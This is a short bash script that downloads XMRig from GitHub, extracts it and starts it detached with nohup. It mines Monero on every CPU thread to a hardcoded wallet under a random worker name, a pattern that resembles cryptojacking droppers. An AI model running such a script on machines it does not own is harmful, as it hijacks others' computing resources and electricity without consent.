#!/bin/bash

set -e

echo "[+] Installing dependencies..."
apt update -y
apt install -y wget tar

echo "[+] Downloading XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-focal-x64.tar.gz

echo "[+] Extracting..."
tar -xvf xmrig-6.26.0-focal-x64.tar.gz

cd xmrig-6.26.0
chmod +x xmrig

echo "[+] Generating worker name..."
RIG=$(head /dev/urandom | tr -dc 'a-z' | head -c 6)

echo "[+] Starting miner..."

nohup ./xmrig \
-o gulf.moneroocean.stream:10128 \
-u 44g3cUJmSyddMg129Tsh2rQdJKpG8DR7pCzEYqfbkFWqASCqNsC8uF5RwJrm3uoqgR4YhT4HWX97rW2ywTEcy5TX8Ga2BPX.${RIG} \
-p x \
--coin monero \
--randomx-mode fast \
--threads=$(nproc) \
> miner.log 2>&1 &
